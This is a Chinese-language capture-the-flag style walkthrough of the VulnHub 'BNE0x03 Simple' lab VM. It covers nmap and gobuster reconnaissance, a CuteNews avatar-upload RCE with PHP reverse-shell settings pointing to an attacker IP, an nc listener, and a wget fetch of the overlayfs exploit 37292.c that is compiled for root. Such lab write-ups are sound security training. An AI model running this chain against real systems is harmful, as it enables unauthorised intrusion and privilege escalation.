# BNE0X03 - simple 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/
-   下载地址：https://download.vulnhub.com/sectalks/Simple.ova

## 信息收集

### 主机发现

```shell
❯ sudo nmap -sn 192.168.2.1/24                                      
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 16:32 HKT
Nmap scan report for 192.168.2.1
Host is up (0.0012s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.0016s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for 192.168.2.146
Host is up (0.00030s latency).
MAC Address: 00:0C:29:76:48:16 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00030s latency).
MAC Address: 00:50:56:E6:75:62 (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds

```



### 端口扫描

```shell
❯ sudo nmap --min-rate 10000 -p- 192.168.2.146 -oA Nmap-scan/Ports          
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 16:33 HKT
Nmap scan report for 192.168.2.146
Host is up (0.0016s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:76:48:16 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds

```



### 服务扫描

```shell
❯ sudo nmap --min-rate 10000 -p 80 -sC -sV -O 192.168.2.146 -oA Nmap-scan/sC   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 16:34 HKT
Nmap scan report for 192.168.2.146
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Please Login / CuteNews
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:76:48:16 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```



### 基本漏洞脚本扫描

```shell
❯ sudo nmap --script=vuln -p 80 192.168.2.146 -oA Nmap-scan/Script                                                               
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 16:35 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.146
Host is up (0.00042s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-enum: 
|_  /rss.php: RSS or Atom feed
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.146
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.2.146:80/
|     Form id: login_form
|     Form action: /index.php
|     
|     Path: http://192.168.2.146:80/?register
|     Form id: regpassword
|     Form action: /index.php?register
|     
|     Path: http://192.168.2.146:80/index.php
|     Form id: login_form
|     Form action: /index.php
|     
|     Path: http://192.168.2.146:80/?register&lostpass
|     Form id: 
|     Form action: /index.php
|     
|     Path: http://192.168.2.146:80/index.php?register
|     Form id: regpassword
|_    Form action: /index.php?register
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 00:0C:29:76:48:16 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.08 seconds

```



## web 信息

-   查看默认页-->发现CMS信息

-   ![image-20230608163946545](https://raw.githubusercontent.com/r0o983/images/main/image-20230608163946545.png)

-   先手动注册一个账号，查看有些什么内容

-   ![image-20230608170036533](https://raw.githubusercontent.com/r0o983/images/main/image-20230608170036533.png)

-   上传图片马之后发现无法进行利用

-   使用`gobuster`进行目录扫描

-   ```shell
    ❯ sudo gobuster dir -u http://192.168.2.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.2.146
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2023/06/08 16:44:12 Starting gobuster in directory enumeration mode
    ===============================================================
    /docs                 (Status: 301) [Size: 312] [--> http://192.168.2.146/docs/]
    /uploads              (Status: 301) [Size: 315] [--> http://192.168.2.146/uploads/]
    /skins                (Status: 301) [Size: 313] [--> http://192.168.2.146/skins/]
    /core                 (Status: 301) [Size: 312] [--> http://192.168.2.146/core/]
    /cdata                (Status: 301) [Size: 313] [--> http://192.168.2.146/cdata/]
    /server-status        (Status: 403) [Size: 293]
    Progress: 218402 / 220561 (99.02%)
    ===============================================================
    2023/06/08 16:44:38 Finished
    ===============================================================
    ```

-   搜索github查找是否有对应的exp

-   找到对应的脚本下载文件获取反弹shell`https://github.com/ColdFusionX/CVE-2019-11447_CuteNews-AvatarUploadRCE`

-   修改rev.php中的回连地址以及端口号

-   ```shell
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '192.168.2.128';  // CHANGE THIS
    $port = 8020;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    ```

-   根据帮助文件来进行设置所需信息

-   ```shell
    ❯ ./exploit.py -h                                                                                                                                                                     
    usage: exploit.py [-h] [-l URL] [-u USERNAME] [-p PASSWORD] [-e EMAIL]
    
    CuteNews 2.1.2 Avatar upload RCE (Authenticated) by ColdFusionX
    
    options:
      -h, --help            show this help message and exit
      -l URL, --url URL     CuteNews URL (Example: http://127.0.0.1)
      -u USERNAME, --username USERNAME
                            Username to Login/Register
      -p PASSWORD, --password PASSWORD
                            Password to Login/Register
      -e EMAIL, --email EMAIL
                            Email to Login/Register
    
    Exploit Usage : 
    ./exploit.py -l http://127.0.0.1 -u cold -p fusion -e cold@decepticon.net
    ./exploit.py -l http://127.0.0.1 -u optimus -p prime -e optimus@autobots.net
    [^] Select your PHP file -> rev.php
    OR
    [^] Select your PHP file -> ~/Downloads/rev.php
    [^] Press y/n to trigger reverse shell -> y
    
    ```

-   执行后发现并无法获得有效信息。并未获得反弹shell

-   ```shell
    ❯ ./exploit.py -l http://192.168.2.146/index.php -u test -p aaabbb -e aaa@hotmail.com 
    [+] CuteNews 2.1.2 Avatar Upload RCE exploit by ColdFusionX 
     
    [+] User exists ! Logged in Successfully
    [^] Select your PHP file -> rev.php
    
    [*] Adding Magic Byte to PHP file
    [+] Upload Successful !!
    [*] File location --> http://192.168.2.146/index.php/CuteNews/uploads/avatar_test_test.php
    
    [^] Press y/n to trigger PHP file -> y
    [*] Check listener for reverse shell
    [*] Execution Completed
    
    ```



### 获得初始shell

-   由于之前上传的图片位置，经过测试可以直接上传php文件。（查searchsploit才发现可以直接传，淦。。。太明显了居然都没测试

-   直接上传一个反弹shell，上传之后的目录在当前IP的`upload`文件夹内

-   ![image-20230608194355351](https://raw.githubusercontent.com/r0o983/images/main/image-20230608194355351.png)

-   本地发起监听，等待连接，成功获得初始shell

-   ```shell
    ❯ sudo nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [192.168.2.128] from (UNKNOWN) [192.168.2.146] 33292
    Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
     07:44:25 up  3:12,  0 users,  load average: 0.00, 0.01, 0.05
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    $ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:76:48:0c brd ff:ff:ff:ff:ff:ff
        inet 192.168.229.129/24 brd 192.168.229.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe76:480c/64 scope link 
           valid_lft forever preferred_lft forever
    3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:76:48:16 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.146/24 brd 192.168.2.255 scope global eth1
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe76:4816/64 scope link 
           valid_lft forever preferred_lft forever
    $ uname -a 
    Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
    $ 
    ```



## 提权

**查看系统内核发现当前系统的版本为`linux kernel 3.16` 搜索对应的exploit，经过测试，最终使用`37292.c`成功获得root权限**

-   搜索当前系统版本的内核漏洞

-   ```shell
    ❯ searchsploit linux kernel 3.16 | grep "Privilege"
    Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation                  | linux_x86-64/local/42275.c
    Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                                                   | solaris/local/15962.c
    Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                                                           | linux/local/50135.c
    Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                                                                  | linux/local/41995.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                        | linux/local/37292.c
    Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                                   | linux/local/37293.txt
    Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                                                  | linux/local/41886.c
    Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                                           | linux/local/34923.c
    Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                                                | linux_x86-64/local/44302.c
    Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                                                                | linux/local/43345.c
    Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                                           | linux/local/45553.c
    Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                               | linux/local/45010.c
    Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                      | linux/local/44298.c
    Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                           | linux_x86-64/local/44300.c
    Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                       | linux/local/43418.c
    Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP) 
    ```

-   下载漏洞利用文件

-   ```shell
    ❯ searchsploit linux kernel 3.16 -m linux/local/37292.c                     
    [!] Could not find EDB-ID #
    
    
    [!] Could not find EDB-ID #
    
    
      Exploit: Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation
          URL: https://www.exploit-db.com/exploits/3
         Path: /usr/share/exploitdb/exploits/linux/local/3.c
        Codes: OSVDB-4565, CVE-2003-0127
     Verified: True
    File Type: C source, ASCII text
    Copied to: /home/kali/Documents/WalkThrough/vulnhub/BNE0x03-simple/3.c
    
    
      Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
          URL: https://www.exploit-db.com/exploits/37292
         Path: /usr/share/exploitdb/exploits/linux/local/37292.c
        Codes: CVE-2015-1328
     Verified: True
    File Type: C source, ASCII text, with very long lines (466)
    Copied to: /home/kali/Documents/WalkThrough/vulnhub/BNE0x03-simple/37292.c
    ```

-   开启PHP简易服务器，等待靶机下载exp

-   ```shell
    ❯ php -S 0:80                                                                                                                                                                   
    [Thu Jun  8 20:24:56 2023] PHP 8.2.5 Development Server (http://0:80) started
    [Thu Jun  8 20:25:21 2023] 192.168.2.146:50882 Accepted
    [Thu Jun  8 20:25:21 2023] 192.168.2.146:50882 [200]: GET /37292.c
    [Thu Jun  8 20:25:21 2023] 192.168.2.146:50882 Closing
    
    ```

-   切换到`/tmp`目录下保证当前用户具有保存权限

-   ```shell
    www-data@simple:/etc/mysql$ cd /tmp
    cd /tmp
    www-data@simple:/tmp$ ls
    ls
    www-data@simple:/tmp$ ls -lhai
    ls -lhai
    total 8.0K
    261983 drwxrwxrwt  2 root root 4.0K Jun  8 08:18 .
         2 drwxr-xr-x 21 root root 4.0K Sep  9  2015 ..
    www-data@simple:/tmp$ wget http://192.168.2.128/37292.c
    wget http://192.168.2.128/37292.c
    --2023-06-08 08:25:21--  http://192.168.2.128/37292.c
    Connecting to 192.168.2.128:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 4968 (4.9K) [text/x-c]
    Saving to: '37292.c'
    
    100%[======================================>] 4,968       --.-K/s   in 0s      
    
    2023-06-08 08:25:21 (1.33 GB/s) - '37292.c' saved [4968/4968]
    
    ```

-   编译，执行！

-   ```shell
    www-data@simple:/tmp$ gcc 37292.c -o 37292
    gcc 37292.c -o 37292
    www-data@simple:/tmp$ ./37292
    ./37292
    spawning threads
    mount #1
    mount #2
    child threads done
    /etc/ld.so.preload created
    creating shared library
    # whoami
    whoami
    root
    ```

-   成功获得root权限读取flag，提权成功！！！

-   ```shell
    # python -c 'import pty;pty.spawn("/bin/bash")';
    python -c 'import pty;pty.spawn("/bin/bash")';
    root@simple:/tmp# whoami
    whoami
    root
    root@simple:/tmp# ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:76:48:0c brd ff:ff:ff:ff:ff:ff
        inet 192.168.229.129/24 brd 192.168.229.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe76:480c/64 scope link 
           valid_lft forever preferred_lft forever
    3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 00:0c:29:76:48:16 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.146/24 brd 192.168.2.255 scope global eth1
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe76:4816/64 scope link 
           valid_lft forever preferred_lft forever
    root@simple:/tmp# cd /root
    cd /root
    root@simple:/root# ls -lhai
    ls -lhai
    total 20K
    261842 drwx------  2 root root 4.0K Sep 21  2015 .
         2 drwxr-xr-x 21 root root 4.0K Sep  9  2015 ..
    261843 -rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc
    261844 -rw-r--r--  1 root root  140 Feb 19  2014 .profile
    261852 -rw-------  1 root root   52 Sep 21  2015 flag.txt
    root@simple:/root# cat flag.txt
    cat flag.txt
    U wyn teh Interwebs!!1eleven11!!1!
    Hack the planet!
    root@simple:/root# 
    
    ```